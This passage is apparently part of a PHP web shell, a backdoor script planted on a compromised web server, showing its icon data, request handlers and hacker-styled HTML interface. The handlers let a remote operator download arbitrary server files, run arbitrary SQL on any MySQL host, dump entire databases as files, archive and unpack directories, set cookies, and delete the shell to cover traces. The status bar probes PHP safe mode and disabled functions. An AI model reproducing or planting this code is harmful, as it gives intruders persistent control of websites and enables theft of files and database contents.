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',
            'rename' => 'R0lGODlhEAAQAJEAAP///wAAAP///wAAACH5BAEAAAIALAAAAAAQABAAAAIxlI8GC+kCQmgPxVmtpBnurnzgxWUk6GFKQp0eFzXnhdHLRm/SPvPp5IodhC4IS8EoAAA7',
            'ed' => 'R0lGODlhEAAQAKIAAAAzZv////3Tm8DAwJ7R/Gmd0P///wAAACH5BAEAAAYALAAAAAAQABAAAANDaAYM+lABIVqEs4bArtRc0V3MMDAEMWLACRSp6kRNYcfrw9h3mksvHm7G4sF8RF3Q1kgqmZSKZ/HKSKeN6I/VdGIZCQA7',
            'downl' => 'R0lGODlhEAAQAJEAADyFFIXQLajcOf///yH5BAEAAAMALAAAAAAQABAAAAI6nAepeY0CI3AHREmNvWLmfXkUiH1clz1CUGoLu0JLwtaxzU5WwK89HxABgESgSFM0fpJHx5DWHCkoBQA7',
            'gzip' => 'R0lGODlhEAAQAKIAAARLsHi+//zZWLJ9DvEZAf///wAAAAAAACH5BAEAAAUALAAAAAAQABAAAANCWLrQDkuMKUC4OMAyiB+Pc0GDYJ7nUFgk6qos56KwJs9m3eLSapc83Q0nnBhDjdGCkcFslgrkEwq9UKHS6dLShCQAADs=',
			'unzip' => 'R0lGODlhEAAQAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAANgALAAAAAAQABAAAAh6ALEJHEiw4EAvCBN6MSjQC4KHEBEsLJgQYkJBGDNi8wLACgsELKwAGElypCCOIRF4BMmipcuTABBcs3KNpcuXHFVa8XjzJkyZNHv6zLnCygqhOGPOvIa0JUwWK64dbYoRAItrAJhSFWQVq1akgrBh9JqxLMaC1xgSDAgAOw=='
        );
        @ob_clean();
        if ((!isset($_GET['ajimg'])) OR (!in_array($_GET['ajimg'], array_keys($IMGS))))
            $_GET['ajimg'] = 'noone';
        header('Cache-Control: public');
        Header('Last-Modified: ' . gmdate('D, d M Y H:i:s', time() - 60 * 60 * 24 * 365) . ' GMT'); //Date('r'
        header('Expires: ' . gmdate('D, d M Y H:i:s', time() + 60 * 60 * 24 * 365) . ' GMT');
        header('Content-type: image/gif');
        echo base64_decode((is_array(($IMGS[$_GET['ajimg']]))) ? $IMGS[$_GET['ajimg']][1] : $IMGS[$_GET['ajimg']]);
        die();
        break;
    
    case 'F_DWN':
        if (!isset($_GET['ajfile']))
            die(AjError('No file selected. Check $_GET[\'ajfile\'] var'));
        if (!file_exists($_GET['ajfile']))
            die(AjError('No such file'));
        if (!is_file($_GET['ajfile']))
            die(AjError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));
        
        $AjDOWNLOAD_File             = array();
        /* prepare struct */
        $AjDOWNLOAD_File['filename'] = basename($_GET['ajfile']);
        if (isset($_GET['ajparam']))
            $AjDOWNLOAD_File['headers'][] = 'Content-type: text/plain';
        /* usual look thru */
        else {
            $AjDOWNLOAD_File['headers'][] = 'Content-type: ' . mime_content_type($_GET['ajfile']);
            $AjDOWNLOAD_File['headers'][] = 'Content-disposition: attachment; filename="' . basename($_GET['ajfile']) . '";';
        }
        $AjDOWNLOAD_File['content'] = file_get_contents($_GET['ajfile']);
        break;
    
    case 'SQL':
        
        if (isset($_POST['ajparam'])) {
            if (!isset($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p'], $_GET['ajsql_d'], $_POST['ajsql_q']))
                die(AjError('Not enough params: $_GET[\'ajsql_s\'],$_GET[\'ajsql_l\'],$_GET[\'ajsql_p\'],$_GET[\'ajsql_d\'],$_POST[\'ajsql_q\'] needed'));
			
			$dbh = new mysqli($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p']);
            
			if (mysqli_connect_errno()) {
				die(AjError('No connection to mysql server!' . "\n" . '<br>MySQL:#' . mysqli_connect_error()));
			}			
			
			if (!$dbh->select_db($_GET['ajsql_d'])) {
				die(AjError('Can\'t select database!' . "\n" . '<br>MySQL:#' . $dbh->error));
			}
			
			AjMySQLQ("SET NAMES 'utf8';", false);
            
            /* export as csv */
            $AjDOWNLOAD_File              = array();
            /* prepare struct */
            $AjDOWNLOAD_File['filename']  = 'Query_' . $_GET['ajsql_s'] . '_' . $_GET['ajsql_d'] . '.csv';
            $AjDOWNLOAD_File['headers'][] = 'Content-type: text/comma-separated-values';
            $AjDOWNLOAD_File['headers'][] = 'Content-disposition: attachment; filename="' . $AjDOWNLOAD_File['filename'] . '";';
            $AjDOWNLOAD_File['content']   = '';
            
            $_POST['ajsql_q'] = explode(';', $_POST['ajsql_q']);
            
            for ($q = 0; $q < count($_POST['ajsql_q']); $q++) {
                if (empty($_POST['ajsql_q'][$q]))
                    continue;			
				
                $num = AjMySQL_FetchResult($dbh->query($_POST['ajsql_q'][$q]), $DUMP, false);
                $AjDOWNLOAD_File['content'] .= "\n\n" . 'QUERY: ' . str_replace(array(
                    "\n",
                    ";"
                ), array(
                    '',
                    "<-COMMA->"
                ), str_replace("\r", '', $_POST['ajsql_q'][$q])) . ";";
                if ($num <= 0) {
                    $AjDOWNLOAD_File['content'] .= "\n" . 'Empty;';
                    continue;
                }
                foreach ($DUMP[0] as $key => $val)
                    $AjDOWNLOAD_File['content'] .= $key . ";";
                /* headers */
                for ($l = 0; $l < count($DUMP); $l++) {
                    $AjDOWNLOAD_File['content'] .= "\n";
                    $INDEXES = array_keys($DUMP[$l]);
                    for ($i = 0; $i < count($INDEXES); $i++)
                        $AjDOWNLOAD_File['content'] .= str_replace(array(
                            "\n",
                            ";"
                        ), array(
                            '',
                            "<-COMMA->"
                        ), str_replace("\r", '', $DUMP[$l][$INDEXES[$i]])) . ";";
                    
                }
            }
        }
        
        break;
    
    case 'SQLD':
        
        if (isset($_POST['ajsql_tables'])) {
            if (!isset($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p'], $_GET['ajsql_d'], $_POST['ajsql_tables']))
                die(AjError('Not enough params: $_GET[\'ajsql_s\'],$_GET[\'ajsql_l\'],$_GET[\'ajsql_p\'],$_GET[\'ajsql_d\'],$_POST[\'ajsql_tables\'] needed'));

			$dbh = new mysqli($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p']);
            
			if (mysqli_connect_errno()) {
				die(AjError('No connection to mysql server!' . "\n" . '<br>MySQL:#' . mysqli_connect_error()));
			}
			
			AjMySQLQ("SET NAMES 'utf8';", false);
			
			if (!$dbh->select_db($_GET['ajsql_d'])) {
				die(AjError('Can\'t select database!' . "\n" . '<br>MySQL:#' . $dbh->error));
			}           
            
            if (empty($_POST['ajsql_tables']))
                die(AjError('No tables selected...'));
            
            $AjDOWNLOAD_File              = array();
            /* prepare struct */
            $AjDOWNLOAD_File['filename']  = 'Dump_' . $_GET['ajsql_s'] . '_' . $_GET['ajsql_d'] . '.sql';
            $AjDOWNLOAD_File['headers'][] = 'Content-type: text/plain';
            $AjDOWNLOAD_File['headers'][] = 'Content-disposition: attachment; filename="' . $AjDOWNLOAD_File['filename'] . '";';
            $AjDOWNLOAD_File['content']   = '';
            
            $AjDOWNLOAD_File['content'] .= "\n\t" . '/* ' . str_repeat('=', 66);
            $AjDOWNLOAD_File['content'] .= "\n\t" . '==== MySQL Dump ' . AjDate(time());
            $AjDOWNLOAD_File['content'] .= "\n\t" . '==== Server: ' . $_GET['ajsql_s'];
            $AjDOWNLOAD_File['content'] .= "\n\t" . '==== DB: ' . $_GET['ajsql_d'];
            $AjDOWNLOAD_File['content'] .= "\n\t" . '==== Tables: ' . "\n\t\t\t" . implode(', ' . "\n\t\t\t", $_POST['ajsql_tables']);
            $AjDOWNLOAD_File['content'] .= "\n\t" . str_repeat('=', 66) . ' */';
            
            if (!empty($_POST['ajsql_q'])) {
                $_POST['ajsql_q'] = explode(';', $_POST['ajsql_q']);
                foreach ($_POST['ajsql_q'] as $CUR)
                    if (empty($CUR))
                        continue;
                    else
                        AjMySQLQ($CUR, true);
                /* pre-query */
            }			
            
            foreach ($_POST['ajsql_tables'] as $CUR_TABLE) {
                $AjDOWNLOAD_File['content'] .= str_repeat("\n", 5) . '/* ' . str_repeat('-', 40) . ' */';
                AjMySQL_FetchResult(AjMySQLQ('SHOW CREATE TABLE `' . $CUR_TABLE . '`;', false), $DUMP, true);
                $AjDOWNLOAD_File['content'] .= "\n" . $DUMP[0][1];
                $AjDOWNLOAD_File['content'] .= "\n\n";
                AjMySQL_FetchResult(AjMySQLQ('SELECT * FROM `' . $CUR_TABLE . '`;', false), $DUMP, true);
                for ($i = 0; $i < count($DUMP); $i++) {
                    for ($j = 0; $j < count($DUMP[$i]); $j++)
                        $DUMP[$i][$j] = $dbh->real_escape_string($DUMP[$i][$j]);
                    $AjDOWNLOAD_File['content'] .= "\n" . 'INSERT INTO `' . $CUR_TABLE . '` VALUES ("' . implode('", "', $DUMP[$i]) . '");';
                }
            }
        }
        
        break;
    
    case 'COOK':
        if (isset($_POST['ajparam'])) {
            foreach ($_POST['ajparam'] as $name => $val) {
                if ($name == 'AJS_NEWCOOK') {
                    if (empty($val['NAM']) or empty($val['VAL']))
                        continue;
                    AjSetCookie($val['NAM'], $val['VAL'], time() + 60 * 60 * 24 * 10);
                } else
                    AjSetCookie($name, $val, (empty($val)) ? 1 : (time() + 60 * 60 * 24 * 10));
            }
            AjGotoURL(AjURL('leave', 'ajmode'));
            die();
        }
        break; 

	case 'ZIP':
		if (isset($_GET['aj_zip'])) {
			$file = AjZipFile($_GET['aj_zip']);
		} elseif(isset($_GET['aj_zipdir'])) {
			$file = AjZipFolder($_GET['aj_zipdir']);
		}
		
		if (file_exists($file)) {
			 $AjDOWNLOAD_File = array();
			/* prepare struct */
			$AjDOWNLOAD_File['filename'] = basename($file);	
			$AjDOWNLOAD_File['headers'][] = 'Content-Type: application/zip';
			$AjDOWNLOAD_File['headers'][] = 'Content-disposition: attachment; filename="' . basename($file) . '";';
			$AjDOWNLOAD_File['headers'][] = 'Content-Length: ' . filesize($file);
			$AjDOWNLOAD_File['content'] = file_get_contents($file);
		} else {
			die(AjError('Can\'t create arhive ' . $file . '! Perms?'));
		}

		break;    
		
	case 'UNZIP':
	
		if (@file_exists($_GET['ajfile'])) {
			if (AjUnzip($_GET['ajfile']) === false) {
				die(AjError('Can\'t unzip arhive ' . $_GET['ajfile'] . '!'));
			}
		} else {
			die(AjError('Can\'t open file ' . $_GET['ajfile'] . '! File does not exists'));
		}
		
		AjGotoURL(AjURL('kill', '') . '&ajmode=DIR&ajdir=' . AjFileToUrl(dirname($_GET['ajfile'])));
		
		break; 	
	
}

if (isset($_GET['ajinstant'])) {
    $_GET['ajinstant'] = strtoupper($_GET['ajinstant']);
    if ($_GET['ajinstant'] == 'DEL') {
        $ok = @unlink(@substr(@strrchr($_SERVER['PHP_SELF'], "/"), 1));
        echo '<script>window.alert("SELF ' . (($ok) ? 'deleted. Reload the page to believe me =)' : 'tried to delete but was unsuccessful') . '");</script>';
    }
}

if (isset($AjDOWNLOAD_File)) {
    /* File downloader for everything */
    if (!$AJGLOBALVARS) {
        if ($GLOB['SYS']['GZIP']['CanOutput']) {
            ini_set('output_buffering', 4096);
            ob_start("AjObGZ");
            header('Content-Encoding: gzip');
        }
		
        for ($i = 0; $i < count($AjDOWNLOAD_File['headers']); $i++)
            header($AjDOWNLOAD_File['headers'][$i]);
        echo $AjDOWNLOAD_File['content'];
        die();
    }
}

###################################################################################
#################### M A I N ####################
###################################################################################
if (!in_array($_GET['ajmode'], array_keys($GLOB['AjMODES'])))
  die(AjError('Unknown $_GET[\'ajmode\']! check $GLOB[\'AjMODES\'] array'));

if (!in_array($_GET['ajmode'], array_keys($GLOB['AjMODES'])))
    die('Unknown $_GET[\'ajmode\']');

if ($AJGLOBALVARS)
    echo str_repeat("\n", 20) . '<!--SHELL HERE-->';
?>
<html>
<head>
<title><?php echo $_SERVER['HTTP_HOST']; ?><?php echo $GLOB['AjMODES'][$_GET['ajmode']]; ?></title>
<Meta Http-equiv="Content-Type" Content="text/html; Charset=utf-8">
<style>
img     {border-width:0pt;}
body, td         {font-size: 10pt; color: #00B000; background-color: #000000; font-family: Arial;padding:2pt;margin:2pt; vertical-align:top;}
h1                {font-size: 14pt; color: #00B000; background-color: #002000; font-family: Arial Black; font-weight: bold; text-align: center;}
h2                {font-size: 12pt; color: #00B000; background-color: #002000; font-family: Courier New; text-align: center;}
h3                {font-size: 12pt; color: #F0F000; background-color: #002000; font-family: Times New Roman; text-align: center;}
caption            {font-size: 12pt; color: #00FF00; background-color: #000000; font-family: Times New Roman; text-align:center; border-width: 1pt 3pt 1pt 3pt;border-color:#FFFF00;border-style:solid solid dotted solid;padding: 5pt 0pt;}
td.h2_oneline    {font-size: 12pt; color: #00B000; font-family: Courier New; text-align: center;background-color: #002000; border-right-color:#00FF00;border-right-width:1pt;border-right-style:solid;vertical-align:middle;}
td.mode_header    {font-size: 16pt; color: #FFFF00; font-family: Courier New; text-align: center;background-color: #002000; vertical-align:middle;}
table.outset, td.outset      {border-width:3pt; border-style:outset; border-color: #004000;margin-top: 2pt;vertical-align:middle;}
table.bord, td.bord, fieldset   {border-width:1pt; border-style:solid; border-color: #003000;vertical-align:middle;}
hr   {border-width:1pt; border-style:solid; border-color: #005000; text-align: center; width: 90%;}
textarea.bout         {border-color: #000000; border-width:0pt; background: #000000; font: 12px verdana, arial, helvetica, sans-serif; color: #00FF00; Scrollbar-Face-color:#000000;Scrollbar-Track-Color: #000000;}
td.listing    {background-color: #000500; font-family: Courier New; font-size:8pt; color:#00B000; border-color: #003000;border-width:1pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:top;}
td.linelisting  {background-color: #000500; font-family: Courier New; font-size:8pt; color:#00B000; border-color: #003000;border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
table.linelisting {border-color: #003000;border-width:0pt 1pt; border-style:solid;}
td.js_floatwin_header {background-color:#003300;font-size:10pt;font-weight:bold;color:#FFFF00;border-color: #00FF00;border-width:1pt; border-style:solid;border-collapse:collapse;}
td.js_floatwin_body      {background-color:#000000;font-size:10pt;color:#00B000;border-color: #00FF00;border-width:1pt; border-style:solid;border-collapse:collapse;}
font.rwx_sticky_bit {color:#FF0000;}
.highlight_txt        {color: #FFFF00;}
.achtung            {color: #000000; background-color: #FF0000; font-family: Arial Black; font-size: 14pt; padding:0pt 5pt;}

input             {font-size: 10pt;font-family: Arial; color: #E0E000; background-color: #000000; border-color:#00FF00 #005000 #005000 #FFFF00; border-width:1pt 1pt 1pt 3pt;border-style:dotted dotted dotted solid; padding-left: 3pt;overflow:hidden;}
input.radio        {border-width:0pt;color: #FFFF00;}
input.submit     {font-size: 12pt;font-family: Impact, Arial Black; color :#00FF00; background-color: #002000; border-color: #00FF00; border-width:0pt 1pt 1pt 0pt; border-style: solid; padding:1pt;letter-spacing:1pt;padding:0pt 2pt;}
input.bt_Yes     {font-size: 14pt;font-family: Impact, Arial Black; color :#00FF00; background-color: #005000; border-color: #005000 #005000 #00FF00 #005000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt; margin: 5pt 10pt;}
input.bt_No     {font-size: 14pt;font-family: Impact, Arial Black; color :#FF0000; background-color: #500000; border-color: #500000 #500000 #FF0000 #500000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt; margin: 5pt 10pt;}
input.bt_Yes:Hover     {color:#000000; background-color:#00FF00;border-bottom-color:#FFFFFF;}
input.bt_No:Hover     {color:#000000; background-color:#FF0000;border-bottom-color:#FFFFFF;}
textarea         {color:#00FF00; background-color:#001000;border-color:#000000;border-width:0pt;border-style:solid;font-size:10pt;font-family:Arial;Padding:5pt;
                Scrollbar-Face-Color: #00FF00; Scrollbar-Track-Color: #000500;
                Scrollbar-Highlight-Color: #00A000;    Scrollbar-3dlight-Color: #00A000; Scrollbar-Shadow-Color: #005000;
                Scrollbar-Darkshadow-Color: #005000;}
select            {background-color:#001000;color:#00D000;border-color:#D0D000;border-width:1pt;border-style:solid dotted dotted solid;}

A:Link, A:Visited { color: #00D000;    text-decoration: underline; }
A.no:Link, A.no:Visited { color: #00D000;    text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #00FF00; background-color:#003300; text-decoration: overline; }
.Hover:Hover {color: #FFFF00; cursor:help;}
.HoverClick:Hover {color: #FFFF00; cursor:crosshair;}
span.margin        {margin: 0pt 10pt;}
td.error {color:#000000; background-color: #FF0000; font-weight: bold; font-size: 11pt;}
td.warning {color:#000000; background-color: #D00000; font-size: 11pt;}
font.img_replacer {margin:1pt;padding:1pt;text-decoration: none;border-width:1pt;border-color:#D0D000;border-style:solid;}
</style>

<?php
if (in_array($_GET['ajmode'], array(
    'UPL',
    'DIR',
    'PRT'
))) {
    /* THIS FLOATING WINDOW IS ONLY SET FOR MODES: */
?>
<script>
var dom = document.getElementById?1:0;
var ie4 = document.all && document.all.item;
var opera = window.opera; //Opera
var ie5 = dom && ie4 && !opera;
var nn4 = document.layers;
var nn6 = dom && !ie5 && !opera;
var vers=parseInt(navigator.appVersion);
var good_browser = (ie5 || ie4);
function showwin(hdr,txt,w,vis)
{
if(good_browser)
    {
    var obj =  document.all('js_floatwin');
    var evnt = event;
    var xOffset = document.body.scrollLeft;
    var yOffset = document.body.scrollTop;

    var temp =
    "<TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH="+ w +">"
    +((hdr!='')?("<TR><TD class=js_floatwin_header>"+ hdr + "</TD></TR>"):"")
    +"<TR><TD class=js_floatwin_body>" + txt + "</TD></TR>"
    +"</TABLE>";

    if (vis == 1)
        {
        obj.innerHTML = temp;
        obj.style.width = w;
        hor = document.body.scrollWidth - obj.offsetWidth;
        posHor = xOffset + evnt.clientX + 10;
        posHor2 = xOffset + evnt.clientX - obj.offsetWidth - 5;
        posVer = yOffset + evnt.clientY - obj.offsetHeight - 5;

        if (posHor<hor)
            obj.style.posLeft = posHor
        else
            obj.style.posLeft = posHor2;

        obj.style.posTop = posVer;

        obj.style.visibility = "visible";
        }
        else
        {
        obj.style.visibility = "hidden";
        obj.style.posTop = 0;
        obj.style.posLeft = 0;
        }
    }
}
function movewin()
{
if (good_browser)
    {
    var obj =  document.all('js_floatwin');
    var evnt = event;
    var xOffset = document.body.scrollLeft;
    var yOffset = document.body.scrollTop;

    hor = document.body.scrollWidth - obj.offsetWidth;
    posHor = xOffset + evnt.clientX + 10;
    posHor2 = xOffset + evnt.clientX - obj.offsetWidth - 5;
    posVer = yOffset + evnt.clientY - obj.offsetHeight - 5;

    if (posHor<hor)
        obj.style.posLeft = posHor
        else
        obj.style.posLeft = posHor2;

    obj.style.posTop = posVer;
    }
}
</script>
<?php
}
/* /END */
?>

</head>
<body>
<?php
if ($AJGLOBALVARS) /* tries to kill all the fucking bug.php pre-output, if ob_clean() failed */ {
    echo str_repeat("\n", 10) . '<!--SHIT KILLER-->';
    echo "\n" . '</body></a>' . str_repeat('</table>', 5) . str_repeat('</div>', 5) . str_repeat('</span>', 5) . str_repeat('</pre>', 1) . str_repeat('</font>', 5) . str_repeat('</script>', 2);
    echo "\n" . '<TABLE WIDTH=100% BORDER=0  style="position:absolute;z-index:100;top:0pt;left:0pt;width:100%;height:100%;"><tr><td>';
    echo "\n\n\n\n";
}
?>

<div id="js_floatwin" style="z-index:50;position:absolute;left:0;top:0;visibility:hidden"></div>
<table width=100% cellspacing=0 cellpadding=0 class=outset>
<tr>
    <td width=100pt class=h2_oneline></td>
    <td>
<?php
echo "\n" . '<div style="margin-right:' . (((strlen($GLOB['REMOTE']['USER']['Login']) + strlen($GLOB['REMOTE']['USER']['Passw'])) >= 2) ? '100' : '30') . 'pt;">';
echo "\n" . (($AJGLOBALVARS) ? '<font color=#FF0000><b>GLOBALVARS</b></font> ; ' : '');
echo "\n" . AjPrint_ParamState('php_ver', phpversion()) . ' ; ';
echo "\n" . AjPrint_ParamState('php_Safe_Mode', $GLOB['PHP']['SafeMode'], '!') . ' ; ';
echo "\n" . AjPrint_ParamState('magic_quotes', (bool) get_magic_quotes_gpc(), '!') . ' ; ';
echo "\n" . AjPrint_ParamState('gZip', function_exists('gzencode')) . ' ; ';
echo "\n" . AjPrint_ParamState('cURL', function_exists('curl_version')) . ' ; ';
echo "\n" . AjPrint_ParamState('MySQL', function_exists('mysql_connect')) . ' ; ';
echo "\n" . AjPrint_ParamState('MsSQL', function_exists('mssql_connect')) . ' ; ';
echo "\n" . AjPrint_ParamState('PostgreSQL', function_exists('pg_connect')) . ' ; ';
echo "\n" . AjPrint_ParamState('Oracle', function_exists('ocilogon')) . ' ; ';
echo "\n" . 'Disabled functions: ' . ((($df = @ini_get('disable_functions')) == '') ? '<font color=#00FF00><b>NONE</b></font>' : '<font color=#FF0000><b>' . str_replace(array(
    ',',
    ';'
), ', ', $df) . '</b></font>');
echo "\n" . '</div>';

echo "\n\n" . '<span align=right style="position:absolute;z-index:1;right:0pt;top:0pt;"><table><tr><td class="h2_oneline"><nobr>';
